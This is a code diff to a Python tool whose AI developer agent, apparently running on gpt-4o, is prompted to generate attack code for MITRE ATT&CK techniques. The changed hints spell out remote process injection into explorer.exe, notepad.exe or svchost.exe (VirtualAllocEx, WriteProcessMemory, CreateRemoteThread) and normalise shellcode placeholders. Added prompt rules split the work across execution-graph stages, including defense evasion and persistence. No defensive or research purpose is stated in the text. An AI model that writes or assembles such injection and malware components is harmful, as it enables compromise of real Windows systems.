@@ -65,14 +65,17 @@ MITRE_CODING_HINTS: Dict[str, str] = {
         "If privilege escalation fails: log and continue, do NOT raise."
     ),
     "T1055": (
-        "NEVER hardcode target PID. NEVER raise uncaught exceptions. "
-        "Step 1: find target using psutil.process_iter(['pid','name']) — "
-        "try in order: 'explorer.exe', 'notepad.exe', 'svchost.exe'. "
-        "If all fail: use ctypes.windll.kernel32.GetCurrentProcess() as fallback, "
-        "set injection_success=False to mark self-injection fallback. "
-        "Step 2: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread. "
+       "Implement ONLY what the behavioral_goal specifies — DO NOT implement the full injection chain:\n"
+        "- If goal says 'allocate' or 'write' (VirtualAllocEx/WriteProcessMemory): "
+        "ONLY do VirtualAllocEx + WriteProcessMemory. "
+        "Store remote_addr in result. DO NOT call CreateRemoteThread.\n"
+        "- If goal says 'execute' or 'CreateRemoteThread': "
+        "ONLY call CreateRemoteThread using remote_addr from input_data.get('remote_addr'). "
+        "DO NOT re-allocate memory or re-write shellcode.\n"
         "PROCESS_ALL_ACCESS = 0x1F0FFF. "
-        "If any step fails: log error, set success=False, return partial result — do NOT raise."
+        "Find target via psutil: explorer.exe → notepad.exe → svchost.exe. "
+        "Fallback: GetCurrentProcess(), set injection_success=False. "
+        "If any step fails: log, set success=False, return partial — NEVER raise."
     ),
     "T1059.003": (
         "Use subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True, timeout=30). "
@@ -346,6 +349,11 @@ def _normalize_placeholders(code: str) -> str:
         'bytes.fromhex("fc4883e4f0")',
         code
     )
+    code = re.sub(
+        r'[A-Z]:\\[Pp]ath\\[Tt]o\\[A-Za-z0-9_\.\\-]+\.exe',
+        r"C:\\Windows\\System32\\notepad.exe",
+        code,
+    )
     return code
 
 
@@ -376,7 +384,7 @@ class DeveloperAgent:
     DANGEROUS = {"eval(", "exec(", "compile(", "__import__("}
 
     def __init__(self) -> None:
-        load_dotenv()
+        load_dotenv(override=False)
         self.model     = os.getenv("OPENAI_MODEL", "gpt-4o")
         self.client    = OpenAI()
         self.max_retry = 3
@@ -431,7 +439,19 @@ CODING RULES:
   - NO excessive defensive checks — trust the caller
   - Clear variable names, comments only for complex parts
   - Type hints on function signatures
-
+PRIORITY RULES:
+  - The behavioral_goal is the highest-priority instruction.
+  - MITRE technique hints are guidance only, not mandatory full-pattern templates.
+  - If a MITRE hint conflicts with the task’s behavioral_goal, stage, input_contract, or output_contract, follow the task specification.
+  - Implement ONLY the minimal behavior needed for the current task.
+  - DO NOT include behavior that belongs to another task in the execution_graph.
+  - DO NOT expand the task with extra persistence, defense evasion, discovery, or execution steps unless explicitly required by the task.
+ENVIRONMENT CONSTRAINTS (STRICT — must follow):
+  - If target_os_family = windows:
+      * DO NOT use root '/' paths or Unix-style paths
+      * DO NOT use Path('/')
+      * Use Windows paths only (e.g., C:\\Users\\..., C:\\Windows\\...)
+      * Use os.environ, Path.home(), or user directories instead of '/'
 BYTES SERIALIZATION RULES (critical for JSON compatibility):
   - bytes fields in OUTPUT: always convert to hex string → value.hex()
     e.g. 'ciphertext': ciphertext.hex()
@@ -975,6 +995,8 @@ if __name__ == "__main__":
                             )
 
                 except Exception as e:
+                    import traceback
+                    traceback.print_exc()
                     prev_errors = [f"{type(e).__name__}: {str(e)[:80]}"]
                     if attempt < self.max_retry - 1:
                         time.sleep(2 ** attempt)
